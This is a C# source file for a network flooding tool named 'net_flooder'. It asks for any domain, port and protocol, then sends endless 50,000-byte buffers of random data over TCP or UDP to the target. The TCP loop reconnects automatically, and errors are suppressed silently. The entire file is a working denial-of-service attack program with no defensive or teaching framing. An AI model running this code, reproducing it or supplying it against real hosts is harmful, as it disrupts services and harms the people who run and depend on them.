﻿using System;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Threading;
namespace net_flooder {
	class core {
		class AttackInfo {
			internal IPEndPoint Target;
			internal ProtocolType Protocol;
		}

	    private const int BUFFER_SIZE = 50000;
	    private const int THREAD_COUNT = 1;

	    static void Main() {
			Debug.Listeners.Add( new ConsoleTraceListener() );
            Console.WriteLine( "Type domain & port & protocol (Tcp|Udp). Each on separate line" );
			var info = new AttackInfo {
			    Target = new IPEndPoint(
			        Dns.GetHostAddresses( Console.ReadLine() )[ 0 ],
			        int.Parse( Console.ReadLine() ) ),
			    Protocol = (ProtocolType)Enum.Parse( typeof(ProtocolType), Console.ReadLine() )
			};

	        Console.WriteLine( "Attacking {0}", info.Target );
			try {
				for ( var i = 0; i < THREAD_COUNT; i++ )
					new Thread( WAttack ).Start( info );
			}
			catch ( Exception ex ) {
				_e( ex.Message );
			}
		}
		private static void WAttack( object trg ) {
			var v =  (AttackInfo)trg ;
		    switch ( v.Protocol ) {
                case ProtocolType.Tcp:
                    TCPAttack( v );
                    break;
                case ProtocolType.Udp:
		            UDPAttack( v );
		            break;
                default:
                    throw new NotSupportedException();
		    }
		}
        private static void TCPAttack( AttackInfo info ) {
            var r = new Random();
            while ( true ) {
                try {
                    #region Constructors
                    var s = CreateSocket( info );
                    var bytes = new byte[ BUFFER_SIZE ];
                    #endregion
                    var conn = new SocketAsyncEventArgs {
                        DisconnectReuseSocket = true,
                        RemoteEndPoint = info.Target,
                        SocketFlags = SocketFlags.None,
                        UserToken = s
                    };
                    var Snd = new SocketAsyncEventArgs {
                        DisconnectReuseSocket = true,
                        SocketFlags = SocketFlags.None,
                        UserToken = s
                    };
                    EventHandler<SocketAsyncEventArgs> snd = ( a, b ) => {
                        try {
                            var running = true;
                            _d( String.Format( "Sent {0}K data!", BUFFER_SIZE ) );
                            while ( running ) {
                                while ( b.SocketError == SocketError.Success && ( (Socket) a ).Connected ) {
                                    try {
                                        if ( ( (Socket) a ).SendAsync( Snd ) )
                                            return; //prevent stack overflow
                                        _d( String.Format( "Sent {0}K data!", BUFFER_SIZE ) );
                                    }
                                    catch {
                                    }
                                }
                                running = false;
                                if ( running ) continue;
                                Snd.UserToken = conn.UserToken = a = s = CreateSocket( info );
                                try {
                                    if ( ( (Socket) a ).ConnectAsync( conn ) )
                                        return;
                                }
                                catch {
                                }
                                running = true;
                                _d( "Connected!" );
                            }
                        }
                        catch {
                        }
                    };
                    EventHandler<SocketAsyncEventArgs> connected = ( a, b ) => {
                        try {
                            _d( "Connected!" );
                            while ( b.SocketError != SocketError.Success || !( (Socket) a ).Connected )
                                try {
                                    if ( ( (Socket) a ).ConnectAsync( conn ) ) {
                                        _d( "Connected!" );
                                        return;//prevent stack overflow
                                    }
                                }
                                catch {
                                }
                            try {
                                if ( !( (Socket) a ).SendAsync( Snd ) )
                                    snd( a, Snd );
                            }
                            catch {
                            }
                        }
                        catch {
                        }
                    };
                    Snd.Completed += snd;
                    conn.Completed += connected;
                    r.NextBytes( bytes );
                    Snd.SetBuffer( bytes, 0, bytes.Length );
                    s.Blocking = false;
                    _d( "real_attack_starting" );
                    if ( !s.ConnectAsync( conn ) )
                        connected( s, conn );
                    Thread.Sleep( Timeout.Infinite );
                }
                catch {
                }
            }
        }
		
		private static void UDPAttack( AttackInfo info ) {
			while ( true ) {
				try {
					#region Constructors
					Socket s = CreateSocket( info );
					Random r = new Random();
					SocketAsyncEventArgs Snd;
					byte[] bytes = new byte[ BUFFER_SIZE ];
					EventHandler<SocketAsyncEventArgs>  SND = null;
					#endregion
					Snd = new SocketAsyncEventArgs() {
						RemoteEndPoint = info.Target,
						DisconnectReuseSocket = true,
						SocketFlags = SocketFlags.None,
						UserToken = s
					};
					SND = ( a, b ) => {
						try {
							_d( String.Format( "Sent {0}K data!", BUFFER_SIZE ) );
							while ( true ) {
									try {
										if ( ( (Socket)a ).SendToAsync( Snd ) )
											break; //prevent stack overflow
										_d( String.Format( "Sent {0}K data!", BUFFER_SIZE ) );
									}
									catch {}
							}
						}
						catch {}
					};
					Snd.Completed += SND;
					r.NextBytes( bytes );
					Snd.SetBuffer( bytes, 0, bytes.Length );
					s.Blocking = false;
					_d( "real_attack_starting" );
					if ( !s.SendToAsync( Snd ) )
						SND( s, Snd );
					Thread.Sleep( Timeout.Infinite );
				}
				catch {}
			}
		}
		static Socket CreateSocket( AttackInfo info ) {
			return new Socket( AddressFamily.InterNetwork, info.Protocol == ProtocolType.Tcp ? SocketType.Stream : SocketType.Dgram, info.Protocol );
		}
		static void _e( string e ) {
			var con_c = Console.ForegroundColor;
			try {
				Console.ForegroundColor = ConsoleColor.Yellow;
			}
			catch {
			}
			Console.ForegroundColor = ConsoleColor.Red;
			Console.WriteLine( e );
			try {
				Console.ForegroundColor = con_c;
			}
			catch {
			}
			Console.ReadLine();
		}
		static string _q( string q ) {
			var con_c = Console.ForegroundColor;
			try {
				Console.ForegroundColor = ConsoleColor.Yellow;
			}
			catch {
			}
			string s = "";
			Console.Write( "{0}{1}>", q, Environment.NewLine );
			try {
				Console.ForegroundColor = con_c;
			}
			catch {
			}
			s = Console.ReadLine();
			return s;
		}
		static void _d( string d ) {
			//Debug.WriteLine( d );
		}
	}
}